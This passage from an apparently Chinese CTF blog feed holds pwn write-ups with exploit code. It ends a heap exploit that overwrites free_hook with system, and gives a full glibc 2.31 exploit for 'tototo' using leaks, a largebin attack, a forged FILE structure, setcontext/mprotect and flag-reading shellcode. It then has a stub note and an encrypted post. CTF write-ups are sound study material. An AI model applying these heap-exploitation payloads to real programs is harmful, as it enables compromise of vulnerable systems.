&nbsp; &nbsp; &nbsp; io.recv()</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; io.recv(<span class="number">8</span>)</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; stdin = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; leak_libc(<span class="string">'_IO_2_1_stdin_'</span>,stdin)</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hex</span>(libc_base).startswith(<span class="string">"0x7f"</span>):</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; io.close()</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="keyword">continue</span></span><br><span class="line">&nbsp; &nbsp; <span class="keyword">except</span>:</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; io.close()</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; <span class="keyword">continue</span></span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">10</span>)</span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">14</span>)</span><br><span class="line">&nbsp; &nbsp; edit(-<span class="number">62</span>,p64(free_hook_addr))</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">14</span>,<span class="number">0x50</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">&nbsp; &nbsp; add(<span class="number">10</span>,<span class="number">0x50</span>,p64(system_addr))</span><br><span class="line">  </span><br><span class="line">&nbsp; &nbsp; delete(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line">&nbsp; &nbsp; io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="tototo"><a href="#tototo" class="headerlink" title="tototo"></a>tototo</h2><p>glibc2.31堆题,开了沙箱,程序逻辑感觉有点莫名奇妙的<br>菜单有malloc、edit、show、delete、calloc.<br>malloc范围在0x200-0x800<br>delete只清空了flag位,但是这个位只在delete的时候检查,基本没用<br>edit存在uaf,但是是read(0,chunk_ptr+9,size-0x30),大概就是防止uaf直接改fd吧,edit有3次机会,超出使用调用edit函数.<br>然后有个free_hook的检查,不为0就exit.<br>直接cat就打了…</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x210</span>)</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x410</span>)</span><br><span class="line">malloc(<span class="number">3</span>,<span class="number">0x210</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recv()</span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">96</span></span><br><span class="line">leak_libc(<span class="string">'__malloc_hook'</span>,main_arena-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recv()</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">0xd10</span></span><br><span class="line">log.success(<span class="string">"heap_base is -&gt;"</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,flat([p64(main_arena+<span class="number">1104</span>)[<span class="number">1</span>:],<span class="number">0</span>,io_list_all-<span class="number">0x20</span>]))</span><br><span class="line">malloc(<span class="number">4</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">fake_io_addr = heap_base+<span class="number">0x8e0</span></span><br><span class="line">cat = <span class="string">b'\x00'</span>*<span class="number">7</span></span><br><span class="line">cat+=p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">cat +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">cat +=p64(fake_io_addr+<span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">cat +=p64(setcontext_addr+<span class="number">61</span>)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">cat = cat.ljust(<span class="number">0x4f</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">cat += p64(<span class="number">0</span>) &nbsp;<span class="comment"># _chain</span></span><br><span class="line">cat = cat.ljust(<span class="number">0x6f</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">cat += p64(heap_base+<span class="number">0x1000</span>) &nbsp;<span class="comment"># _lock = a writable address</span></span><br><span class="line">cat = cat.ljust(<span class="number">0x87</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">cat +=p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">cat = cat.ljust(<span class="number">0xa7</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">cat += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">cat = cat.ljust(<span class="number">0xbf</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">cat += p64(libc_base+libc.sym[<span class="string">'_IO_wfile_jumps'</span>]+<span class="number">0x30</span>) &nbsp;<span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">cat +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">cat += p64(fake_io_addr+<span class="number">0x40</span>) &nbsp;<span class="comment"># rax2_addr</span></span><br><span class="line"></span><br><span class="line">frame = flat([heap_base,<span class="number">0x2000</span>,<span class="string">'\x00'</span>*<span class="number">0x10</span>,<span class="number">7</span>,<span class="string">'\x00'</span>*<span class="number">0x10</span>,fake_io_addr+<span class="number">0x160</span>,mprotect_addr])</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; push 0x67616c66</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; mov rdi,rsp</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; xor esi,esi</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; push 2</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; pop rax</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; syscall</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; mov rdi,rax</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; mov rsi,rsp</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; mov edx,0x100</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; xor eax,eax</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; syscall</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; mov edi,1</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; push 1</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; pop rax</span></span><br><span class="line"><span class="string">&nbsp; &nbsp; syscall</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,cat+frame+p64(fake_io_addr+<span class="number">0x168</span>)+shellcode)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'is:'</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="kheap"><a href="#kheap" class="headerlink" title="kheap"></a>kheap</h2><p>好像是kernel的题,以后回来复现了…</p>]]></content>
      
      
      <categories>
          
          <category> ctf复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一生所爱</title>
      <link href="/2022/Flower-of-Love/"/>
      <url>/2022/Flower-of-Love/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3f7e0701b1c39d3ff774f67d2512e053c1e357a197c30e3596179bb393b6b92b">da4bbaa5f4a81c86b46c395d66869d966030e95d1b63f40456dab4a5b86457fd7553ffb65d7be5502668bf7b8131f2c96bbbe2dc01cacfd589ee5c151864832a3b30e814f6cda2503836c6054e2de9cdf4f9f180986070fe5aaf1c57b5e1c46a81f0aa7d2e15ea018e7f4ff28e05b5fd3e983ba41633549127fecb77b2707ccb7721fccc02130344f033c8e00c77f67103c4e67551e211b9f2c903b33782482eae916119214e2b66555375c136435706d48eededc5306433a13f642933be96dbbb42883cfae41f8c8513dbf8e2b468f2847895be778a4c1054d323de18291a870b01ffa42c58ad2afb1f3d50f592b3341f0304435d35e5474f8a3615842348ca0b8f9745249c63e3a295bd9e7a3cec080a6b272d9934c7e480ae2f44b306aed292fd3bf85084bc6aabdb7d03d158a874049cbf788365da14b0329e4ad9c9410e2e66532cb4eeb04f55ffe42105446f213a0b3ed478b762db641c3fae4f3c8cbdf72faef8efed3e866fd610a4f506856747722ed67c4871667701ea06199e44667ffd8b9e851f32947d38c3473fe9bbc82342e341890a560bea69c93c71cb7f38d56d0265aea723779d4f12336bf5fb43dd60eae9b33b9e762faf41a436a486a4215eec779daf533c415e4f22e81b3f004dfa88d530bbcea5688f58c434b48d39d333ae3a34cf394461e01ad8305c2f1a14f27a363232ffc2220878ca2059bc8b4668aedcfbe699b05a385aa940bffc5bd1debc835301bffe68a678994eba0ce5768fc2364719f2f106db15f2d1c22f20b79ad957037e47d3e33c4bc5b53bfdff00f974736438694ada384460086f048a7e8488cba514831ba97a85afb8b7ecd07a5961234971095f178ccdd4143ecd84223ed67261e43cccbf56531dfabff55c1e49c88577b080c75cac495e9cc4fa721c3cb19d757437a73df6fc5c25cfd7597130f8c52156307f2c7771f78401441ffeea5065ae825989493e4de5a2b3218a7d69029c84c835207349d4f6c386550c77d573dbacc414186939b3d6658843de18d077b92e7f0de876da2bec2db95c559a23263047f387e7e6b20c0a7f8f4cbd81662eb8c80c2e9027b6ccb7843e643b6feab37867a6093f1a306923a59062689e5bae1ad5f482360b11568f1a37ac22ac9853bef35e3c74d77bb39e443109002c1ef4d06d1afa907ae9d0219f61ae22df5b8db1983b2f2b7bbd354cb5df0bf8374a327501c383a2d82bbcac0709123f2611b3a84639762fc76c649200f27bcd73e2ee7cd66164917d3058e2a237831adbf3e7bcea820c4488940d8e5ce04c35e0cdd6ec300948fd5506a99a9c123c39db976bcafacb17fe29080d587b333f1293daeb1de92f30b05fd6f3592356378fc436e2305afa5e441c16db4d64387fc1b0856e2fb570a658163a74415078ac0486a73ef120a62ad95a82e14c53ee17d0e24d09b617eb505b4ffea96317daa5c6d403abeb249eed7fa7084297ebb86540f056260124302aa83e098ce6ae2c62578be681ef7995b02303c4b64719f78189fd415e87b01190012ef26c480372b3632f40345736dc1b893c48322081a1d03fd99a30406fd30a6bb4250a3579ed0f4b2b0e9dae58535b37cba3a43d661bad563e8cab2baf3e043b6b7d28ca3ab54c59833ef29434adb68f077cf4fa5c3338d16146ebd2d47b835a720183924b9eb026e281eb6905e101a230dbe4918e6ce72254f66d5b251a75b022dc5aa478cc2c1a1b73ee5c3b71bbbf85aec06318c3ad1abc4b1aa188e90b408e5e45b0399a41d571ba674c3b999ecf4fb73867bdab0103810fc20e30c53f1aaeb88c5a7660e05e5f0ce6818ebed9f61ead8f769e02fb7df06f2faba5368b28ed1425f838ebb3b228850c6ea22bc828e96b64f348f1c5df796727eb88e3c5ea59386a3bb5e9c2b784fa49929180d41d2d02a83f8e8527a50db0ec872d2bdb55eb3d3709b7eb8d09d8fe81d0e2b1bbd6688d11a1d49514e6bcd9b12dcca0d28a73fd5c3e2ae2a970279e10b697e03d37ec741f4656d1b1ea278753bb9e29cb918de9f871db523fc57813ff2f9bf56c8c0cd8e4738377f71bb3a93f7723b3d8e5eee54ca04f3152d96e25759a2f4e6d5659131ab006502bc952a626dd0c71bcbcf63479dc85052bf6a0be15724c0b0760ea5e1f233ad9c2cc10c09d10657cb51b3ca90e534c7fe67fb8fbec30fec83e9016713c9ddb9c98df267a4b3fa517cbf9c608dd741ba513ed13a818bd6684d18b0b98bdf5084bccde3692115f8aba6da138437001254c0ee919d0776fe8b043daa41a817e79ae48b7ea10fe80c15b099636e900adb67eda8955ee8faa1f958ca634125635138b4ae3d3232638b27936f6f606fe3699e6b9dfa9a9f392ef05fc652620595f49fe01069cff5ede48486e95e309504ca915439bb810df76fdce0057ea6dc85efe53824d99f607a3f79ea3664e2d8ff8904c3912e29b94344e9ab2a01aa78385a7b2b4c6e7b40471c5350bbbffef5c8ccd701d2982244f509cfdba6013a82c72f5731b7084b858254dd3a06740702064832f8ea7595030c5ae82228780587b0f8d77578dc2e64841650a0a6d8d39bb12b8665a7b5d8a348ee10ca7a0c44425acf32c0f0a0bc86b8485ec31c68fe7e42c3ab852803d942bf4734d2da0741b303cc633129f1d2dc91287dd048d2def17240be71af1dbe5b4989b97df62efc0911ac9fce29060cfbca2666791a97d9a47a56786a48d967538e7aa1cbe3c1dbfcd5d7c0190849d2e35205fca99bfa1ea980c0b6f034bf3e3aeaf85d4b5b84e6672868ae32a67c603e620d0bb8d59052bcf758294a108f6487030acfc78233886a25c16c1a8ddc28fd9f64af1fc03eb2a32994be0ef3e3eb2c01b477245b5e3d9f1a4e71c101bd539efccd6e4e01732398a81e654332b1f4515fb7eac7ef5f3cd4cbd2d9555fbb463be1feab46ddcb14839fe1ba68dece6143bd5d0bf6c062be7f78fb3182e2398c9c2479683e49b5bf5f14c455308692db30c0fef6f5a04126fef51027ecadd38227a78f8d458dd7a958df37f8b35adc6a1c1e821d5487db32c639290a953a4770fd159928db8b55f9c7da6ad963c159360861c2555c6070c486151baefd8695da3564957ec37dc459e030ec42ed773156386c6d32c1ca4ac60e75b08c4d3e81ba542a282a11117916b9e713dbfb57ffcd571cf1c6683ea9749b653d872883237fb209ea29087372a0dc1bc78aa9eeaa944f54e7dbe1ed2622687f11d482e5d95ec5ac5d234038f983982ede37ea342d2c144ed7a3f2fe2377d6ce9269a090900969fab882265a911e836343122f0bbea1458f456198cbe3aea426145a60804c6a60f6194dc7db96c623101800474662cb7adde0ca3572a5189db1c75f9a3485184d04869278e888f02f30bc0836b91f5d8e7fdf049f38092d2ae4dcf1ab9526a79b62ccd95583ab29b3f61e7ee6ce1d356c23fb0639b639dde98d23d7cd97abceefca064d4ae6cdfcc6a4cf269cb30d03b5f0302f5da2c7f9840b9fa1c1f1a0805e9a16be608e477bae6da35ebe9b98e51b904dbe57ddf845bd807221a2d9f8927a0a77abc3462cd85360dbbac3784a271387b9cfa73296728bd31eb63ccef350c3c3d23ff2f6425dc100e67849876f181b7347e4813992c33bfbe8dbfe1baccd5b99b8908cd8e88c4419ec1c726d0a325880bc0f05b4d024e32325828d4d6fa5842bee07fe8cb0501103f8dba8965cfcef37672a65376f1cf01d0f8dabd563f020b7f910f05c3b40e958d72cd43a9db1db0140d80078719ec1b8867001bc43303c4c7fd7f1fbd78a9765931731ee84f58c81614f09d4f0c56293f3a6a6ae01ee8f8acd671533be69cd2ce02cc714946908f9e3150262de4cefab6be00c9a376e0220e9476db924191a2583b3dafad764736ee8ed9045ebf4a93ef3f27caa99727fa16b1621539a72608b27d577a175ba8f2efb7264cf8f77b85e71e87f1edb799e82bd89a5434fe34da8eddf87db3a3f6a762c6148609ed9b68b8f1a9b30372422325459f7aac175519307c19653b825d761d90df575cd688315fc88e75788183ed163e3660252d8f6b54f762c5850098b1cf52d965848945fa0e71937bfd3bbeb33dffb39bde7271df9eabd3a23223c0c6791a1073994db7bd59fd8c51a056a31e5c6d71fa0646673703e37c9f8f5bf08c70ed0909910d99029f22c054e137098f8b0aec0a1b556730c53e14076e3ab8f616a52e7b8fda921d4a086b17a1d21ee893f819749c30b2154068ece9217c19200dda95f79d04129ca80a3d59d40beaf751ff6465ca3785d2a1ed8c6660ee87fa81d330a387055bfc1d9352a0cb170eced2d1daf9ed15ed84ff5144a03a003582826f9ac24a85276893b0bfab526986a653bd21d089fd0e161236298a7ed15732e98182b36625427edb5aba06a2fa76c75d63f81b433e1e3096f23af1292efcc393d36ef2547e7ab0c6af31d4e8d124ce5b81512054909dc999c83341024b5d89abf07a95c3210ce51029ee213d9fe37ec98e078397be033925bcaae11b869780b5d14c6458faed6a9ffce27efa8f00d663faf6adb1967fa43b02b4d70cc0e2a28624e16aeb89790e858f85f80c1ba285f1e09038dc88abe12e516cecdbd3be39cf4e24cc63c441fcd607aaccfc3ccd09ed88655738a4550c5e4b34ac4521902107fb4f9dd69c822c638c17b633708f19a563e35e851a54ff7fe991e1bc04b92797afd33c308fc51a5d46a9516fa16189178ea9ee43eea6d6c55944419efa8085651c76251a70bf655fb5a70393432ba6340bfde21cb84e3b446aa185418f872f64afc6c9a4e21ab571793025bf05da12e9bba2f88890f3a18ed1b5337047c39a5ef0f83c39312eecb72810aa548d94005bb7303b609715ec4e8231585002fc1711757ffcad656f6caee1140f093219d1e94c211be2fd4162f2e575d144e65ac411dce48de132f342f6cb64099d4b38f7294fb6914b49e367a2e0a985ee64d68cd4f9e1829df5288a6f263ab4c868a719770fe2c8fb42a55f4435937e368ce1c69d0e0a389d445a7c047331d1e5b784cff71b05808582c46fa72d77a289b2bffa446d2b8f7671f599b211dc7aa421cb069d99129f8560d7397f26a5cb0d59638b44c0cd9ebfb04587a4520c80d8a0d59e355cc2f33528cf8a5e9cfedbec309b1961d79929d31be9a283320a5fff5729d86fd4797b299ff8ecdc8d142f40c1fcf4c2a72a82dc3d1233ed71e43dd9881778a6b59cdcc0cbac71cf24e80c99a7f9273040b2e71408f85db82011626fb472548afc1040a5bb386ba4e9f469baac856656415b118910b3988edd01a8fb6e810b3e904e815218e926b0ac84c5ccded646aed17b273ff459800aa4b3e3760eb0cf1548f5091659013d671fdb531b3b7887f1efee38c92123749dc248678c45fee41315f753fd03e53e2b68209bb0c3fc831fccfb95a47c1dc4cf4497951f746d389a86f6087aa764ca3954657d255fcf2104f9b7118f01ae9c03f0b9616e34aaa0530f3124534626ed7633f0d71e3d602400bc351e3a9fa91d9f479dd5f7dcb2a39804fcfff7ae1c585885c331f918cb726a320be9eccf97c34b373bc99fe2ad5810e68dc24851e9756765058d6eb757f8c8f06bcfa20ceb3cfc1a81b275af63ce7203db454eb6b6391917acef1e0a7a3dc908116fa3520a891ef876b599a9dd3439353a347538a77f4053ce6dd90c8bd66fff178ca166573fe2009caf4c8128ceab18c9f778e917d95f0d3eed676f08eede52136c87ab6c3b65aa4aa435b3e92191cab881837baf77b57eee2cf9bedecaa6601289f12ed308a9584dd5097f6c6ef25d17d5f2c6d7ff45838a4740af85e9e761e0e9b9539dc043c2955b2a22f0f54b399ee27d160e2866924278adcae38e64aa82ea82adc159536ee403490a968cd9bdd7788a68adb6f115a0b2110d160b39960c695dcd93d8cd631ddb75a41463f9e7e0067f5cac4b242925e1fe7b257fb8b3778736391e1c724c7a29244d2badfa1c695862f1cdb52344d0bfa5515430d3ec930d390c25b7faf4cea1580c6d2b4bee892b10aae6c36824bf7af9fc1261696ebdafa5ca22837ed12a5fa6578e8a350e56ca35b12e911ba2807ad295fc6d391294b0fa5ab562b1f5f7f15419f8016b3be411e065722fa34aa5a4c76fe9d8561656678f1179c2cb0b8e0fe00f47d042d1ccbbdf924d55830b757297153bedeaf7dfe0fc974bce59f410a2f96212993e7ca7dc4264297d4bc2098ca4c69f12be931513faec07297e9fb10c9b6da0cea3a78b6dcaa048b0fff562febe059c025c39bc5d2c44fbb3c65c6df57951e000ed79175760e8148d87a3a4b302ca439f0a859905fa8fbd7cc01e346b8ee53fa1ed192a236361207ece40a202dcdcb480a7f983bbcaefed9f02100936523ec49bd235074b8f727e6ac4736563f8b8f86b647647c20a3f778dd2d66f957cf062409996dcbdd3332e3c0d96e4962b96c16f5f6693c710a595309b96029f707b768c7769f90b343a3421a0b8ce1756927c4642432539846baabcba4fedde1eb932f12d7e6543ace4aafabf1e0c4cd53d2a47e8e696229ad2d66650b0ca162396699bb0c67e9e857fe911ad27130eb8d64aacb1c921d0e712f442981a781206dd555869125455ff98c6806afe6e5592444e977f9fd9154ae3e2d0897e30df1eefe260f300a96bad5e9b1989312edced85d467619fcc8abf9c5c7ec58b4fae76da32caa84da02c0b0f33dc601d1c59722210c4966e264e1768a02e8e9096ba67ff022205162e222b5f779cec698e5aca7d29215b163b78cce6162065c21eb1226213ca7a016cdf4da66e627b2cb0fd3e434cffa9f65e7d4269bc503893f879cd865bf9801c3fc8d0b08e45c7187a9fa508a28cedb6661872c02278a09695d2a7565bbe390420cc2c880dbaf611b9faf916cde9357126bf2bc25b832a09074b983c95b6c50ddbe258b02cb81c65f949a2ca140a40216380565333476caa1446c7450404f24de54cd36f55bba4a766dbe4410a707aed01da8a237f01cf06e9eae58531367dd0c41bb22e04355e23b2b2046c1276436ca09d3f01df3299be63abcd6239a58ada3c20a1adb30b0024b0847ba562cc6216eff1ddcb52088d42e208fede00fe1a80a65e790f259f108320bd66bfc896bc20759ddf2d8d5f81959d126a5836c0ade4b8d2176b330b258063e599fac90b761d23f988f03bc0ce1d0290815ffb7afb99c2bf9ed2e5bd9d48cff3d2e06d355f718a2ab448f8ba65ff17c2edc84ce4d22b9dc7071a9aa2e844a5c6397d51668d0345c1aa113e0b34c1b6eb0590e6bfbecdf51a9e97e58fef42a67da3a8a3c8c06cee1dbd36001fa0a49e0c84a07eca9efc7b82cbd652397742b61f52249484022820472836ddb0aca35a1ce7fe104a85846b5c0d58fd82a6e0e22c74d81a51f9da1ac93cbca99564401fbf90e848a042b29fb898fe6505f99006dff30f8c5e49309264a745b207676628aca095451ee0a4ea8533e54de45e2155da3b2017f97a771ac9c00c6594b755d76c769be1b49f53645d07a2f398d93558758e2e984949950f4ad3c619eb28a3b35902edf1698332b1f0f866db9e7dafee7ddb1443fcf7a02a769002f0e7a9947c03cf00972e2acba95044d76102bd3bdef56ad97988deb7b47ef79906946d7f51627e6125b96a5f41fb7ad989285ed6a2cba91b83cf143dcb82b11d2a7d2f5067632ac9d9db470998fc48a2952b39e43874dadba7a31354fa41aa2eec6ba386322574cefd5d9a30782a24eca26545f2795648b0ecfbffc29370f676bd941a5cbcbd7145b8529e9283719c5c2f84e782f1be4a11bd209efafae2e0df3ee616cd2eb1c53de50939fbc26c798b4bd4447704197d71735f6607db354f423daa868856bf306ac12a8b5ca43ae5a8035e45ac5c7996b0f11df75e503831f6462367c4032e8b4dbf4af1639e07ad74df40fa4a453e024e6bb4dcdf90addf15e271b048a048a755d6b1a216ec59edf4ae78513b5652818274ba22cc77c63f8df9c846d703e69905591c5cd85d69c467f5cbe20f4fcb7febf0275841ab6a838bf3782f60943bd42b3e68cca12074b1a3db18dceddc23aa1f5deb1004dd122f9e91e23aeb101279c4d9a87da289c013f413eaee887a0d7c30fce356772ea1fbf239b19d0d3d23c2b287612362457370b00f39ccb08a45f423304672d54ed66ba0c536ffe6c058e81c44f167d76f1ce6ed36937d962a2e65d000a32adf306336a728cccdff065c80a84c6dcc231fb42b2cf51a1b6b791b1b7a4a414b1c2c3d22ad5f04f20da0064c87f9aa79bb8dd0e6a6c35ca3a1b3705bb501aa7004586ff627a463c33c7efd6d95d1b8089cb1f210d2c830f57f88bff8fd85f19dd4b0127cc6f3090659be2284cb8522a82f2cef28e655c744647588bebab90a3983050d3be26e922c4635d9f8a1fec68d705a831ded4a18d620b67153bfdee38f6b33f21f2441fbefd6a5fb99eb40aa48799c81b1c31c45bbf968d8c3afa0d6a9685e0b269e1eb4b662094c303d22ba72697d2e7eb9d34fdee1bcd830fb88a5b016beb3b37bc30be7fd3531eb4345ae9c3ed83ad8473eaabb2b3144e3add4e448c8ba2b883f9c3dbc975a9f2435ab86e7215415bcebd858f3f933b2c005b66aff398744ad4abeb4943c500bfd2d264d2873835093b0b07ab2533476617e56be1921974be55b38aaaba4af5f7dbb59ea9264ec0226346ae700aba8c13681353e773eaec62e630980ae86390db7f235df48576910cd661941c9ad33f22b1ca5395cbb54432594b556b0b1441dab9f04bd0972b689d3a749eb7d2f67c6bb10692eed2199dbbca3599b9e82c396ab617f26c2977408ee89ae8f32ed31150412571799c91b3e3dbdad1217b4aac4b5e566a53e901c1deb423161351981aa928ea10dd8905edc8daa0d7642ad3d449991bd33fb6991f86894838fa33f1df4e1b84baf0ef3d83f8232eed28618e2c384ba74a93cc103b8f98fd2cf1c7b00fcad574ee6e9befc16c03c73fd1dbf33773d9e849da72f3234e417a7752c3a32901201a86626fc373c1f558167477d9f450abc49772525667fb9bd7f22229c135c11e3efb2b3070f16762b6290cad167bd27e8b110cf71cb90de6f146dfada57ed0902687cd3766b2640c15ae2f940d78ebb81292dad4bf6d940f13dacbd9323ab8050a01d0e10f00c4bc2b74643e2fb1417023373b390dfcbb0c312107316b45be4626b9fba574a72ef03d6d4344112a64f94d4f55a5ccd852df978973d4b9afb1001a9009d5cfdb6b31255c34a2080ff6368fb13d8511a780a4e2e97d6679408187791d92467ab5701427e2aa305fef206c1cb4cc3f37d9ede238b5e96ae06547f7d7761d5213cc4d57cf7f4162366590b647e572748a0dc9515e305a7aa10670bbe21464aa96e43b2d7dee92e5c7dc31e1cbed763b9a4b8ca55a3c67b2bf7eade86fac53fd98b00b281518099f5fb2b0e54f9674816f77a846a1d2e8472a44c7368793f9563b491bd31f99316b3bf9834b77878ac661815cd162ab42625805579c530c70cc2eeeb73a4a33b3402a5ed761c5d84ec7608ac91b11b7255cbf9268e08226b2b7a476d1d5d940ef52cc7cd58d5187afa7acb37f995e0e19c9debb965160593cba00facd19313beae940e55c264916e6d9f585137db981fc5e94fbff367942cbcda914d5ae06f28f43487bfa3474992e18a5b97658ced61e8c8b9f921679e4fd1e9117306772a0ace99776276649deb60816f954d6e03656aca2197775e275fbfca292e4bab841590190e2112beffb790be4256b75d6c6a7958aa149d9fa031b43a02d250949cd78bfad4842e9c7ca4a0c82a56ec08bd92b5b7b520685a0c895b34e336dad965e98d13d715328c59948771605399791b1130883b604218460e545af3a51194b2db8879c5194c584ca05e40ebfdcd4b42f9c9ed1816da3f605d07fc30ce92c111ca37bba2d5989574778a7b47572d71d90363a4178d7098ce8be83976f7ea3ed4c93e09656c949b63ca328f70575b47560b178001a80089851c19ce18b353da8ce9cb210f8e30a4238e39adf626a66c246fa210d8b84b31244c8db8ca9ab14b485bbca8df419f607a9c5c58aa7804ee661bf8e2ead7da88424239ffeb44f67c28c957d865adf8cde796ef5f147e17ad76bfc462634093bb5c8c2e7f19793186ff5ea7c1fc49f6961664f2893afa5ef4a26b6583677f25911432de16495cae6efcf57304990a78bf35e6929938ef7ea4f11f7fbb4363d3e6449db287c6457e00c8a37e7e57ac20160037dae9b1094c6b1bf44df9525c7118bf1315f46f51ffe0c9c04d44f2da1887eb11aee1303536d748e8a9329335d62025b83a4a9f9fae9630e72f6dc1bb29cf4da7675e8a6a9c9b2ef9b2301249b17c93fe696cd9c8f1fd8064db040dcd436b6b244123a28ba4206faf206a9567319321de39d011005ea0a2806162cea310335d35f20893d72d888f37fd59e18ec96edbdc1706468b9883b594320a0c065652c8a66cafa4aee3c265c36d9bdb3e9f9fdae49ebd55443769ac2e87d7b9dc53b4685f38ebfbd6311abf7f50a84e37fd77d3a130f58d04abcd8230ce44897dfcc0bb34f2345114cd7da16bcff453041925e1c46d33777f9d6208bf534a78d0cb8a7e62b8e747ee94e2ff673d9672960be7a61eced67b3047be0f319af5aadb799949d9957aec5fe09e2525c4f1dc983b9f46441497675b4503953e0a8499b505f000008831afd070908f338f84434f0d73cb02623012c525a21695099728d33cb7ea29ef1001db68ba898180eb751b428af530a058d5796ca5b5b562951933741e5318bae558ac9cdf1050efcce858bd497eb6c15277b1b0797fae464d7040e08ea7bb767d3e0c93d5bb09b2af58cb36824b063edf2e8d55099f5ed0af987278e9d816590b518d9b705ce674418f9d10ca57c28c3fe575696cabe77ddf92e95cbabee8692d1f4f2c228f8eaf280fa4dab8eea14e3d9b272668122c9bc510f4a9d707e0fb397b2